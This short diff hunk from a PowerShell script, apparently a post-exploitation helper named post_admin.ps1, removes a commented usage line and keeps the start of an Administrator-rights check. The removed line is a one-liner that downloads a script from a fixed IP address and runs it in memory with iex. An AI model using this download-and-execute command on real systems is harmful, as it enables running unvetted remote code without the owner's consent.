@@ -1,5 +1,3 @@
-# powershell -c "$r = iwr http://192.168.45.203/post_admin.ps1 -UseBasicParsing; $s = (New-Object System.IO.StreamReader($r.RawContentStream)).ReadToEnd(); iex $s"
-
 # Ensure the script is run as Administrator
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {
